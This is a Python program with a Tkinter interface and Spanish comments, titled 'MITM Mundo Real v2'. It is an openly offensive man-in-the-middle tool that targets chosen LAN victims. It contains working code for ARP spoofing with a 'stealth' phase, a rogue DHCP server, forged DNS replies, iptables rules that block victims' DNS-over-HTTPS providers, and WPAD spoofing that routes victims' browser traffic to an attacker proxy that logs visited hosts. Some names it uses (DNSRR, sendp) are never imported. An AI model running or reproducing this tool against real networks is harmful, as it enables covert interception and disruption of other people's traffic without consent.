

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MITM Mundo Real v2 - DoH Killer Dinámico + WPAD Fake Proxy
Automático, Rápido, Sigiloso, Anti-DoH Dinámico, Captura HTTPS
"""

import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
from scapy.all import (ARP, Ether, send, srp, sniff, DNS, DNSQR, IP, UDP, 
                       BOOTP, DHCP, TCP, conf, get_if_addr, get_if_hwaddr,
                       Raw, Packet)
import time
import threading
import os
import random
import sys
import socket
import re
from collections import defaultdict

conf.verb = 0

# ============== CONFIG GLOBAL ==============
ip_gateway = None
ip_atacante = None
mac_atacante = None
iface = None

victimas = {}
victimas_lock = threading.Lock()
log_lock = threading.Lock()

# Tracking dinámico de DoH
conexiones_doh_detectadas = set()
doh_lock = threading.Lock()

# WPAD Proxy
wpad_activo = False
proxy_socket = None

# ============== FUNCIONES RED ==============

def get_network_info():
    global ip_atacante, mac_atacante, iface, ip_gateway
    try:
        iface = os.popen("ip route | grep default | awk '{print $5}' | head -n1").read().strip()
        ip_atacante = get_if_addr(iface)
        mac_atacante = get_if_hwaddr(iface)
        ip_gateway = os.popen("ip route | grep default | awk '{print $3}' | head -n1").read().strip()
        return True
    except:
        return False

def get_mac(ip, retries=3):
    for _ in range(retries):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans = srp(pkt, timeout=2, verbose=0)[0]
            for _, rcv in ans:
                return rcv.hwsrc
        except:
            pass
        time.sleep(0.2)
    return None

def is_root():
    try:
        return os.geteuid() == 0
    except:
        return True

def enable_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
    os.system("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding 2>/dev/null")

# ============== DOH KILLER DINÁMICO ==============

def doh_killer_dinamico(ip_victima, evento_stop, widget_salida, nombre):
    """
    Detecta y bloquea DoH dinámicamente:
    1. Sniffa tráfico HTTPS de la víctima
    2. Detecta patrones DoH (SNI, tamaños de paquete, timing)
    3. Bloquea dinámicamente las IPs que comportan como DoH
    4. Mantiene lista actualizada
    """
    global ip_atacante, conexiones_doh_detectadas

    log_msg(f"[{nombre}] 🔍 DoH Killer Dinámico activado...")

    # Patrones de SNI (Server Name Indication) típicos de DoH
    doh_domains = [
        b'cloudflare-dns.com', b'cloudflare-dns', b'dns.cloudflare.com',
        b'dns.google', b'google-dns', b'dns.google.com',
        b'doh.opendns.com', b'dns.quad9.net', b'doh.dns.sb',
        b'dns.adguard.com', b'dns-family.adguard.com',
        b'doh.cleanbrowsing.org', b'dns.digitale-gesellschaft.ch'
    ]

    # Tracking de conexiones sospechosas
    conexiones_sospechosas = defaultdict(lambda: {'count': 0, 'last_seen': 0, 'domains': set()})

    def analizar_paquete(pkt):
        if evento_stop.is_set():
            return True

        if not (IP in pkt and TCP in pkt):
            return False

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport

        # Solo analizar tráfico de la víctima
        if src_ip != ip_victima and dst_ip != ip_victima:
            return False

        # Detectar HTTPS (puerto 443)
        if dport == 443 or sport == 443:
            # Analizar payload si existe
            if Raw in pkt:
                payload = bytes(pkt[Raw].load)

                # Buscar SNI (Server Name Indication) en TLS Client Hello
                # El SNI está en el handshake TLS, típicamente en los primeros bytes
                for domain in doh_domains:
                    if domain in payload:
                        ip_doh = dst_ip if src_ip == ip_victima else src_ip

                        with doh_lock:
                            if ip_doh not in conexiones_doh_detectadas:
                                conexiones_doh_detectadas.add(ip_doh)
                                # Bloquear inmediatamente
                                os.system(f"iptables -A FORWARD -s {ip_victima} -d {ip_doh} -p tcp --dport 443 -j DROP 2>/dev/null")
                                os.system(f"iptables -A FORWARD -s {ip_victima} -d {ip_doh} -p tcp --sport 443 -j DROP 2>/dev/null")
                                log_msg(f"[{nombre}] 🚫 DoH Detectado: {ip_doh} ({domain.decode()})")
                                log_msg(f"[{nombre}] 🚫 Bloqueado dinámicamente via iptables")
                        return False

                # Heurística adicional: paquetes pequeños y frecuentes (patrón DoH)
                # DoH típicamente envía consultas DNS encapsuladas en HTTPS (tamaño ~500-1500 bytes)
                if 200 < len(payload) < 2000:
                    ip_remota = dst_ip if src_ip == ip_victima else src_ip
                    conexiones_sospechosas[ip_remota]['count'] += 1
                    conexiones_sospechosas[ip_remota]['last_seen'] = time.time()

                    # Si hay más de 10 conexiones rápidas a la misma IP 443, probablemente DoH
                    if conexiones_sospechosas[ip_remota]['count'] > 10:
                        tiempo_transcurrido = time.time() - conexiones_sospechosas[ip_remota]['last_seen']
                        if tiempo_transcurrido < 5:  # 10 conexiones en menos de 5 segundos
                            with doh_lock:
                                if ip_remota not in conexiones_doh_detectadas:
                                    conexiones_doh_detectadas.add(ip_remota)
                                    os.system(f"iptables -A FORWARD -s {ip_victima} -d {ip_remota} -p tcp --dport 443 -j DROP 2>/dev/null")
                                    log_msg(f"[{nombre}] ⚠️ DoH Heurístico: {ip_remota} (patrón de tráfico)")

        # Limpiar conexiones antiguas cada 30 segundos
        if random.random() < 0.01:  # 1% de probabilidad por paquete
            ahora = time.time()
            for ip in list(conexiones_sospechosas.keys()):
                if ahora - conexiones_sospechosas[ip]['last_seen'] > 60:
                    del conexiones_sospechosas[ip]

        return False

    try:
        sniff(
            filter=f"host {ip_victima} and port 443",
            prn=analizar_paquete,
            stop_filter=lambda x: evento_stop.is_set(),
            store=0
        )
    except Exception as e:
        log_msg(f"[{nombre}] Error DoH Killer: {e}")

    log_msg(f"[{nombre}] DoH Killer detenido")

# ============== WPAD FAKE PROXY ==============

def wpad_fake_proxy(ip_victima, evento_stop, widget_salida, nombre):
    """
    WPAD (Web Proxy Auto-Discovery) Fake:
    1. Responde a consultas DNS de wpad.dat con IP del atacante
    2. Sirve archivo wpad.dat que configura proxy = atacante
    3. La víctima envía TODO el tráfico HTTP/HTTPS al atacante
    4. El atacante puede ver headers, intentar SSL strip, etc.
    """
    global ip_atacante

    log_msg(f"[{nombre}] 🌐 WPAD Fake Proxy activando...")

    # Configurar DNS para wpad.local, wpad.lan, etc.
    dominios_wpad = ['wpad', 'wpad.local', 'wpad.lan', 'wpad.home.arpa']

    def dns_wpad_handler(pkt):
        if evento_stop.is_set():
            return True

        if DNS in pkt and pkt[DNS].qr == 0:
            try:
                dominio = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.').lower()

                if any(w in dominio for w in dominios_wpad):
                    # Responder con IP del atacante
                    respuesta = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                                UDP(dport=pkt[UDP].sport, sport=53) /                                DNS(id=pkt[DNS].id, qr=1, aa=1,
                                   qd=DNSQR(qname=dominio),
                                   an=DNSRR(rrname=dominio, ttl=300, rdata=ip_atacante))

                    send(respuesta, verbose=0)
                    log_msg(f"[{nombre}] WPAD DNS: {dominio} -> {ip_atacante}")

                    # Iniciar servidor HTTP para wpad.dat si no está corriendo
                    iniciar_servidor_wpad(ip_atacante)
            except:
                pass
        return False

    try:
        sniff(
            filter=f"udp port 53 and host {ip_victima}",
            prn=dns_wpad_handler,
            stop_filter=lambda x: evento_stop.is_set(),
            store=0
        )
    except Exception as e:
        log_msg(f"[{nombre}] Error WPAD: {e}")

    log_msg(f"[{nombre}] WPAD detenido")

def iniciar_servidor_wpad(ip):
    """Inicia servidor HTTP simple para servir wpad.dat"""
    global wpad_activo

    if wpad_activo:
        return  # Ya está corriendo

    wpad_activo = True

    def servidor():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((ip, 80))
            sock.listen(5)

            log_msg(f"🌐 Servidor WPAD en {ip}:80")

            # Contenido del archivo wpad.dat (configuración proxy)
            wpad_content = f"""function FindProxyForURL(url, host) {{
    return "PROXY {ip}:8080; DIRECT";
}}"""

            while True:
                try:
                    sock.settimeout(1.0)
                    conn, addr = sock.accept()
                    data = conn.recv(1024)

                    if b'wpad.dat' in data or b'GET /' in data:
                        response = f"""HTTP/1.1 200 OK
Content-Type: application/x-ns-proxy-autoconfig
Content-Length: {len(wpad_content)}

{wpad_content}"""
                        conn.send(response.encode())
                        log_msg(f"🌐 WPAD.dat servido a {addr}")

                    conn.close()
                except socket.timeout:
                    continue
                except:
                    pass
        except Exception as e:
            log_msg(f"Error servidor WPAD: {e}")

    hilo = threading.Thread(target=servidor, daemon=True)
    hilo.start()

    # También iniciar proxy transparente en 8080
    iniciar_proxy_transparente(ip)

def iniciar_proxy_transparente(ip):
    """Proxy simple en 8080 para capturar tráfico"""
    def proxy():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((ip, 8080))
            sock.listen(10)

            log_msg(f"🔍 Proxy transparente en {ip}:8080")

            while True:
                try:
                    sock.settimeout(1.0)
                    conn, addr = sock.accept()
                    # Aquí podrías implementar SSL strip o logging
                    # Por ahora solo logueamos que hay conexión
                    data = conn.recv(4096)
                    if data:
                        # Intentar parsear host destino
                        try:
                            host = None
                            if b'Host: ' in data:
                                host = data.split(b'Host: ')[1].split(b'\r\n')[0].decode()
                            elif b'CONNECT ' in data:
                                host = data.split(b'CONNECT ')[1].split(b' ')[0].decode()

                            if host:
                                log_msg(f"🔍 Proxy: Conexión a {host} desde {addr}")
                        except:
                            pass

                    # Cerrar (o reenviar al destino real si quieres MITM completo)
                    conn.close()
                except socket.timeout:
                    continue
                except:
                    pass
        except Exception as e:
            log_msg(f"Error proxy: {e}")

    hilo = threading.Thread(target=proxy, daemon=True)
    hilo.start()

# ============== ARP HÍBRIDO (RÁPIDO + SIGILOSO) ==============

def arp_hibrido(ip_victima, mac_victima, evento_stop, widget_salida, nombre):
    global ip_gateway, mac_atacante

    mac_gateway = get_mac(ip_gateway)
    if not mac_gateway:
        return

    log_msg(f"[{nombre}] 🚀 FASE 1: Infección rápida...")

    inicio = time.time()
    while not evento_stop.is_set() and (time.time() - inicio) < 30:
        try:
            send(ARP(pdst=ip_victima, hwdst=mac_victima, 
                    psrc=ip_gateway, hwsrc=mac_atacante, op=2), verbose=0)
            send(ARP(pdst=ip_gateway, hwdst=mac_gateway,
                    psrc=ip_victima, hwsrc=mac_atacante, op=2), verbose=0)
            time.sleep(1)
        except:
            pass

    if evento_stop.is_set():
        restaurar_arp(ip_victima, mac_victima, mac_gateway, nombre)
        return

    log_msg(f"[{nombre}] 🥷 FASE 2: Sigiloso...")

    def handler(pkt):
        if evento_stop.is_set():
            return True
        if ARP in pkt and pkt[ARP].op == 1:
            if pkt[ARP].pdst == ip_gateway:
                send(ARP(op=2, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc,
                        psrc=ip_gateway, hwsrc=mac_atacante), verbose=0)
            if pkt[ARP].pdst == ip_victima and pkt[ARP].psrc == ip_gateway:
                send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway,
                        psrc=ip_victima, hwsrc=mac_atacante), verbose=0)
        return False

    try:
        sniff(filter="arp", prn=handler, 
              stop_filter=lambda x: evento_stop.is_set(), store=0)
    except:
        pass
    finally:
        restaurar_arp(ip_victima, mac_victima, mac_gateway, nombre)

def restaurar_arp(ip_v, mac_v, mac_gw, nombre):
    try:
        for _ in range(5):
            send(ARP(pdst=ip_v, hwdst=mac_v, psrc=ip_gateway, hwsrc=mac_gw, op=2), verbose=0)
            send(ARP(pdst=ip_gateway, hwdst=mac_gw, psrc=ip_v, hwsrc=mac_v, op=2), verbose=0)
            time.sleep(0.3)
        log_msg(f"[{nombre}] ✅ ARP restaurado")
    except:
        pass

# ============== DHCP AGRESIVO ==============

def dhcp_agresivo(ip_victima, mac_victima, evento_stop, widget_salida, nombre):
    global ip_atacante, mac_atacante

    log_msg(f"[{nombre}] 🎭 DHCP AGRESIVO...")

    try:
        mac_bytes = bytes.fromhex(mac_victima.replace(':', ''))
    except:
        mac_bytes = b'\x00' * 6

    def crear_oferta():
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") /               IP(src=ip_atacante, dst="255.255.255.255") /               UDP(sport=67, dport=68) /               BOOTP(op=2, yiaddr=ip_victima, siaddr=ip_atacante,
                    giaddr=ip_atacante, chaddr=mac_bytes,
                    xid=random.randint(1, 999999)) /               DHCP(options=[
                  ("message-type", 2),
                  ("server_id", ip_atacante),
                  ("subnet_mask", "255.255.255.0"),
                  ("router", ip_atacante),
                  ("dns_server", ip_atacante),
                  ("lease_time", 30),
                  ("renewal_time", 10),
                  "end"
              ])
        return pkt

    log_msg(f"[{nombre}] 💣 Bombardeo 5s...")
    for _ in range(10):
        if evento_stop.is_set():
            break
        sendp(crear_oferta(), verbose=0)
        time.sleep(0.5)

    log_msg(f"[{nombre}] 🔄 Manteniendo...")
    while not evento_stop.is_set():
        try:
            sendp(crear_oferta(), verbose=0)
            evento_stop.wait(10)
        except:
            pass

# ============== BLOQUEO DNS TRADICIONAL ==============

def bloquear_dns_tradicional(ip_victima, activar=True):
    if activar:
        os.system(f"iptables -A FORWARD -s {ip_victima} -p udp --dport 53 -j DROP 2>/dev/null")
        os.system(f"iptables -A FORWARD -s {ip_victima} -p tcp --dport 53 -j DROP 2>/dev/null")
        os.system(f"iptables -t nat -A PREROUTING -s {ip_victima} -p udp --dport 53 -j DNAT --to-destination {ip_atacante}:53 2>/dev/null")

def dns_falso(ip_victima, evento_stop, nombre):
    def handler(pkt):
        if evento_stop.is_set():
            return True
        if DNS in pkt and pkt[DNS].qr == 0:
            try:
                dom = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                if "arpa" in dom:
                    return False
                resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                        UDP(dport=pkt[UDP].sport, sport=53) /                        DNS(id=pkt[DNS].id, qr=1, aa=1,
                           qd=DNSQR(qname=dom),
                           an=DNSRR(rrname=dom, ttl=86400, rdata="0.0.0.0"))
                send(resp, verbose=0)
                log_msg(f"[{nombre}] DNS: {dom} -> 0.0.0.0")
            except:
                pass
        return False

    try:
        sniff(filter=f"udp port 53 and host {ip_victima}", 
              prn=handler, stop_filter=lambda x: evento_stop.is_set(), store=0)
    except:
        pass

# ============== CONTROLADORES GUI ==============

def log_msg(msg):
    with log_lock:
        try:
            widget_salida.insert(tk.END, msg + "\n")
            widget_salida.see(tk.END)
        except:
            pass

def agregar():
    global victimas
    ip = entrada_ip.get().strip()
    nombre = entrada_nombre.get().strip() or f"Target_{len(victimas)}"
    modo = modo_sel.get()

    if not ip or ip == ip_gateway:
        return

    try:
        octetos = ip.split('.')
        if len(octetos) != 4 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octetos):
            raise ValueError
    except:
        messagebox.showwarning("Error", "IP inválida")
        return

    with victimas_lock:
        if ip in victimas:
            messagebox.showwarning("Error", "IP ya existe")
            return

    log_msg(f"🔍 Escaneando {ip}...")
    ventana.update()

    mac = get_mac(ip)
    if not mac:
        messagebox.showwarning("Error", "No responde a ARP")
        return

    with victimas_lock:
        victimas[ip] = {
            'nombre': nombre, 'mac': mac, 'modo': modo, 'activo': False,
            'evento': threading.Event(), 'hilo': None,
            'evento_dns': threading.Event(), 'hilo_dns': None,
            'evento_doh': threading.Event(), 'hilo_doh': None,
            'evento_wpad': threading.Event(), 'hilo_wpad': None
        }

    entrada_ip.delete(0, tk.END)
    log_msg(f"✅ {nombre} [{modo}] agregado")
    actualizar()

def iniciar(ip):
    global victimas, wpad_activo

    with victimas_lock:
        if ip not in victimas or victimas[ip]['activo']:
            return

        datos = victimas[ip]
        datos['activo'] = True
        datos['evento'] = threading.Event()
        datos['evento_dns'] = threading.Event()
        datos['evento_doh'] = threading.Event()
        datos['evento_wpad'] = threading.Event()
        modo = datos['modo']

        # ARP base (todos los modos lo necesitan)
        if modo in ["rapido", "sigiloso", "total", "doh_killer", "wpad"]:
            target = arp_hibrido if modo != "sigiloso" else pasivo_puro
            hilo = threading.Thread(
                target=target,
                args=(ip, datos['mac'], datos['evento'], widget_salida, datos['nombre']),
                daemon=True
            )
            datos['hilo'] = hilo
            hilo.start()

        # DHCP
        if modo == "dhcp_agresivo":
            hilo = threading.Thread(
                target=dhcp_agresivo,
                args=(ip, datos['mac'], datos['evento'], widget_salida, datos['nombre']),
                daemon=True
            )
            datos['hilo'] = hilo
            hilo.start()

        # DNS tradicional + DoH Block
        if modo in ["total", "doh_killer"]:
            bloquear_dns_tradicional(ip, True)

            # DNS falso
            hilo_dns = threading.Thread(
                target=dns_falso,
                args=(ip, datos['evento_dns'], datos['nombre']),
                daemon=True
            )
            datos['hilo_dns'] = hilo_dns
            hilo_dns.start()

            # DoH Killer Dinámico (lo nuevo)
            hilo_doh = threading.Thread(
                target=doh_killer_dinamico,
                args=(ip, datos['evento_doh'], widget_salida, datos['nombre']),
                daemon=True
            )
            datos['hilo_doh'] = hilo_doh
            hilo_doh.start()

        # WPAD Fake Proxy (lo nuevo)
        if modo == "wpad" or modo == "total":
            hilo_wpad = threading.Thread(
                target=wpad_fake_proxy,
                args=(ip, datos['evento_wpad'], widget_salida, datos['nombre']),
                daemon=True
            )
            datos['hilo_wpad'] = hilo_wpad
            hilo_wpad.start()

    log_msg(f"🚀 [{datos['nombre']}] {modo} INICIADO")
    actualizar()

def pasivo_puro(ip_v, mac_v, evento, widget, nombre):
    global ip_gateway, mac_atacante
    mac_gw = get_mac(ip_gateway)
    if not mac_gw:
        return

    def handler(pkt):
        if evento.is_set():
            return True
        if ARP in pkt and pkt[ARP].op == 1:
            if pkt[ARP].pdst == ip_gateway:
                send(ARP(op=2, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc,
                        psrc=ip_gateway, hwsrc=mac_atacante), verbose=0)
            if pkt[ARP].pdst == ip_v and pkt[ARP].psrc == ip_gateway:
                send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gw,
                        psrc=ip_v, hwsrc=mac_atacante), verbose=0)
        return False

    send(ARP(op=2, pdst=ip_v, hwdst=mac_v, psrc=ip_gateway, hwsrc=mac_atacante), verbose=0)
    try:
        sniff(filter="arp", prn=handler, stop_filter=lambda x: evento.is_set(), store=0)
    finally:
        restaurar_arp(ip_v, mac_v, mac_gw, nombre)

def detener(ip):
    global victimas
    with victimas_lock:
        if ip not in victimas or not victimas[ip]['activo']:
            return
        datos = victimas[ip]
        datos['activo'] = False
        datos['evento'].set()
        datos['evento_dns'].set()
        datos['evento_doh'].set()
        datos['evento_wpad'].set()
        hilos = [datos['hilo'], datos['hilo_dns'], datos['hilo_doh'], datos['hilo_wpad']]

    for h in hilos:
        if h and h.is_alive():
            h.join(timeout=5)

    log_msg(f"🛑 [{datos['nombre']}] Detenido")
    actualizar()

def eliminar(ip):
    global victimas
    with victimas_lock:
        if ip not in victimas:
            return
        if victimas[ip]['activo']:
            detener(ip)
        nombre = victimas[ip]['nombre']
        del victimas[ip]
    log_msg(f"🗑 {nombre} eliminado")
    actualizar()

def iniciar_todos():
    with victimas_lock:
        ips = [ip for ip in victimas if not victimas[ip]['activo']]
    for ip in ips:
        iniciar(ip)
        time.sleep(0.3)

def detener_todos():
    with victimas_lock:
        ips = [ip for ip, d in victimas.items() if d['activo']]
    for ip in ips:
        detener(ip)

def emergencia():
    log_msg("\n🚨 EMERGENCIA TOTAL")
    detener_todos()
    time.sleep(1)
    os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
    log_msg("✅ Sistema restaurado")
    messagebox.showinfo("Listo", "Restaurado")

def actualizar():
    for w in frame_lista.winfo_children():
        w.destroy()

    with victimas_lock:
        if not victimas:
            tk.Label(frame_lista, text="Sin objetivos", fg="gray", bg="white").pack(pady=20)
            return
        items = list(victimas.items())

    for ip, d in items:
        color = "#e74c3c" if d['activo'] else "#ecf0f1"
        estado = "🔴 ACTIVO" if d['activo'] else "⚪ OFF"

        frame = tk.Frame(frame_lista, bg=color, padx=5, pady=3, relief=tk.RIDGE, bd=2)
        frame.pack(fill=tk.X, pady=2)

        tk.Label(frame, text=f"{d['nombre']} | {ip} | {estado}", 
                bg=color, width=40, anchor="w", font=("Consolas", 9, "bold")).pack(side=tk.LEFT)
        tk.Label(frame, text=d['modo'], bg=color, font=("Arial", 8)).pack(side=tk.LEFT, padx=5)

        bf = tk.Frame(frame, bg=color)
        bf.pack(side=tk.RIGHT)

        if d['activo']:
            tk.Button(bf, text="⏹", bg="orange", command=lambda i=ip: detener(i)).pack(side=tk.LEFT, padx=1)
        else:
            tk.Button(bf, text="▶", bg="green", fg="white", command=lambda i=ip: iniciar(i)).pack(side=tk.LEFT, padx=1)
        tk.Button(bf, text="🗑", fg="red", command=lambda i=ip: eliminar(i)).pack(side=tk.LEFT, padx=1)

def on_close():
    with victimas_lock:
        activos = sum(1 for d in victimas.values() if d['activo'])
    if activos > 0 and messagebox.askyesno("Salir", f"{activos} activos. ¿Restaurar?"):
        emergencia()
    ventana.destroy()

def init():
    if not is_root():
        messagebox.showerror("Error", "Ejecutar como root")
        sys.exit(1)
    if not get_network_info():
        messagebox.showerror("Error", "No se pudo obtener info red")
        sys.exit(1)

    enable_forward()
    lbl_info.config(text=f"Gateway: {ip_gateway} | Tu IP: {ip_atacante}")

    log_msg("="*60)
    log_msg("🔥 MITM MUNDO REAL v2 - DoH Killer Dinámico + WPAD Proxy")
    log_msg("="*60)
    log_msg("MODOS:")
    log_msg("• dhcp_agresivo: Gana al router DHCP")
    log_msg("• rapido: ARP Híbrido (rápido 30s, luego sigiloso)")
    log_msg("• sigiloso: ARP Pasivo puro")
    log_msg("• doh_killer: Bloquea DoH dinámicamente (detecta cualquier IP)")
    log_msg("• wpad: Captura tráfico HTTPS via WPAD fake proxy")
    log_msg("• total: Todo junto (ARP + DoH Killer + WPAD)")
    log_msg("="*60)

# ============== GUI ==============
ventana = tk.Tk()
ventana.title("MITM Mundo Real v2 - DoH Killer + WPAD")
ventana.geometry("950x750")

tk.Label(ventana, text="🔥 MITM MUNDO REAL v2 - DoH Killer Dinámico + WPAD Fake Proxy", 
        bg="#c0392b", fg="white", font=("Arial", 12, "bold"), pady=10).pack(fill=tk.X)

lbl_info = tk.Label(ventana, text="Inicializando...", bg="#e74c3c", fg="white")
lbl_info.pack(fill=tk.X)

# Input
frm = tk.LabelFrame(ventana, text="Nuevo Objetivo", padx=10, pady=10)
frm.pack(pady=10, padx=10, fill=tk.X)

tk.Label(frm, text="IP:").grid(row=0, column=0)
entrada_ip = tk.Entry(frm, width=18, font=("Consolas", 11))
entrada_ip.grid(row=0, column=1, padx=5)
entrada_ip.insert(0, "192.168.1.")

tk.Label(frm, text="Nombre:").grid(row=0, column=2)
entrada_nombre = tk.Entry(frm, width=15, font=("Consolas", 11))
entrada_nombre.grid(row=0, column=3, padx=5)

tk.Label(frm, text="Modo:").grid(row=0, column=4)
modo_sel = ttk.Combobox(frm, values=["dhcp_agresivo", "rapido", "sigiloso", "doh_killer", "wpad", "total"], width=15)
modo_sel.grid(row=0, column=5, padx=5)
modo_sel.set("total")

tk.Button(frm, text="➕ Agregar", command=agregar, bg="#2980b9", fg="white", 
         font=("Arial", 10, "bold")).grid(row=0, column=6, padx=10)

# Lista
frm_lista = tk.LabelFrame(ventana, text="Objetivos", padx=5, pady=5)
frm_lista.pack(pady=5, padx=10, fill=tk.X)
frame_lista = tk.Frame(frm_lista, bg="white")
frame_lista.pack(fill=tk.X)

# Botones
tk.Button(ventana, text="▶️ INICIAR TODOS", command=iniciar_todos, 
         bg="#27ae60", fg="white", width=20, font=("Arial", 11, "bold")).pack(pady=5)
tk.Button(ventana, text="⏹️ DETENER TODOS", command=detener_todos, 
         bg="#f39c12", fg="white", width=20, font=("Arial", 11, "bold")).pack(pady=5)
tk.Button(ventana, text="🚨 RESTAURAR TODO", command=emergencia, 
         bg="#c0392c", fg="white", width=25, font=("Arial", 12, "bold")).pack(pady=10)

# Log
frm_log = tk.LabelFrame(ventana, text="Log", padx=5, pady=5)
frm_log.pack(pady=5, padx=10, fill=tk.BOTH, expand=True)
widget_salida = scrolledtext.ScrolledText(frm_log, width=100, height=20, 
                                         font=("Consolas", 9), bg="#2c3e50", fg="#00ff00")
widget_salida.pack(fill=tk.BOTH, expand=True)

ventana.protocol("WM_DELETE_WINDOW", on_close)
init()
ventana.mainloop()